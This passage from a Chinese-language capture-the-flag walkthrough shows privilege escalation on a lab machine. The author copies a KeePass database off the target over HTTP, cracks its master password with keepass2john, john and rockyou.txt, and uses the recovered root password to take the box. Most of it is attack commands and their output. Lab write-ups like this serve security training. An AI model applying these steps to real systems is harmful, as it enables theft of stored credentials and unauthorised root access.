<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116223221.png alt=image.png>
该目录下同时发现，<code>.kdbx</code>文件，该文件是keepass密码管理器的数据库，内容加密</p><p>靶机开启HTTP服务</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python3 -m http.server <span style=color:#ae81ff>9861</span>
</span></span></code></pre></div><p>将<code>.chadroot.kdbx</code>文件下载到kali中解密</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>root㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>└─# wget http://10.9.23.155:9861/.chadroot.kdbx
</span></span><span style=display:flex><span>--2024-01-16 22:50:11--  http://10.9.23.155:9861/.chadroot.kdbx
</span></span><span style=display:flex><span>Connecting to 10.9.23.155:9861... connected.
</span></span><span style=display:flex><span>HTTP request sent, awaiting response... <span style=color:#ae81ff>200</span> OK
</span></span><span style=display:flex><span>Length: <span style=color:#ae81ff>2174</span> <span style=color:#f92672>(</span>2.1K<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>application/octet-stream<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Saving to: ‘.chadroot.kdbx’
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>.chadroot.kdbx                   100%<span style=color:#f92672>[=======================================================</span>&gt;<span style=color:#f92672>]</span>   2.12K  --.-KB/s    in 0.002s  
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>2024-01-16 22:50:12 <span style=color:#f92672>(</span><span style=color:#ae81ff>961</span> KB/s<span style=color:#f92672>)</span> - ‘.chadroot.kdbx’ saved <span style=color:#f92672>[</span>2174/2174<span style=color:#f92672>]</span>
</span></span></code></pre></div><p>使用 keepass2john 和 john 破解该数据库的密码</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>root㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>└─# keepass2john .chadroot.kdbx | tee hash
</span></span><span style=display:flex><span>.chadroot:$keepass$*2*60000*0*d34ff0b3bbce285d4553b994d1377a942145c2066611eeec2b4de8359f92d18c*e1ae12738ee79dabedfaf7f387275bfb4afc77b6943d02c156eabfaac3c2e58b*638b2e50ed9f0e910f7a96dbeb990c6d*4779254b4e0535bbfa31cf2d31a8ef86033ddbc13be2a5b25e9b0b5983448681*d32ea132be90e65089bfb5c7b6fee69019ada50b62d2e11c6d77d92f2856ba1c
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>┌──<span style=color:#f92672>(</span>root㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>└─# john hash --wordlist<span style=color:#f92672>=</span>/usr/share/wordlists/rockyou.txt
</span></span><span style=display:flex><span>Using default input encoding: UTF-8
</span></span><span style=display:flex><span>Loaded <span style=color:#ae81ff>1</span> password hash <span style=color:#f92672>(</span>KeePass <span style=color:#f92672>[</span>SHA256 AES 32/64<span style=color:#f92672>])</span>
</span></span><span style=display:flex><span>Cost <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>iteration count<span style=color:#f92672>)</span> is <span style=color:#ae81ff>60000</span> <span style=color:#66d9ef>for</span> all loaded hashes
</span></span><span style=display:flex><span>Cost <span style=color:#ae81ff>2</span> <span style=color:#f92672>(</span>version<span style=color:#f92672>)</span> is <span style=color:#ae81ff>2</span> <span style=color:#66d9ef>for</span> all loaded hashes
</span></span><span style=display:flex><span>Cost <span style=color:#ae81ff>3</span> <span style=color:#f92672>(</span>algorithm <span style=color:#f92672>[</span>0<span style=color:#f92672>=</span>AES 1<span style=color:#f92672>=</span>TwoFish 2<span style=color:#f92672>=</span>ChaCha<span style=color:#f92672>])</span> is <span style=color:#ae81ff>0</span> <span style=color:#66d9ef>for</span> all loaded hashes
</span></span><span style=display:flex><span>Will run <span style=color:#ae81ff>4</span> OpenMP threads
</span></span><span style=display:flex><span>Press <span style=color:#e6db74>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#66d9ef>for</span> status
</span></span><span style=display:flex><span>chatter          <span style=color:#f92672>(</span>.chadroot<span style=color:#f92672>)</span>     
</span></span><span style=display:flex><span>1g 0:00:03:21 DONE <span style=color:#f92672>(</span>2024-01-16 23:04<span style=color:#f92672>)</span> 0.004961g/s 133.8p/s 133.8c/s 133.8C/s colombiano..candyapple
</span></span><span style=display:flex><span>Use the <span style=color:#e6db74>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span></code></pre></div><p><img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116230500.png alt=image.png></p><p>使用<a href=https://app.keeweb.info/>https://app.keeweb.info/</a>网站在线查看密码数据库，使用第三个密码</p><p>得到root用户和密码</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>用户：root
</span></span><span style=display:flex><span>密码：.:.subjective.:.
</span></span></code></pre></div><p>登录root用户，提权成功</p><p><img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116231234.png alt=image.png></p><p>夺旗flag</p><p><img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240117085313.png alt=image.png></p><div class=footer>Powered by <a href=https://gohugo.io/>Hugo</a> with
<a href=https://github.com/mrmierzejewski/hugo-theme-console/>Console Theme</a>.</div></div></body></html>